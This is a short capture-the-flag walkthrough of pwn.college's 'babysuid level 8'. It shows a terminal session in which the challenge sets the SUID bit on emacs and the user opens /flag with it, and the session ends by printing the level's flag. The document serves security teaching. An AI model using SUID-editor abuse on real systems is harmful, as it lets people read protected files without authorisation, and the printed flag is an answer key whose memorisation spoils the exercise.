```bash
hacker@program-misuse-level-8:~$ ls
Desktop
hacker@program-misuse-level-8:~$ cd /
hacker@program-misuse-level-8:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-8:/$ cd challenge/
hacker@program-misuse-level-8:/challenge$ ./babysuid_level8 
Welcome to ./babysuid_level8!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/emacs.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level8) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/emacs!
hacker@program-misuse-level-8:/challenge$ emacs /flag
```


```
The flag is 
pwn.college{ck6RBvEkHx9xF_TZr8LnaukNyl4.0FM1EDL0AjNzQzW}
```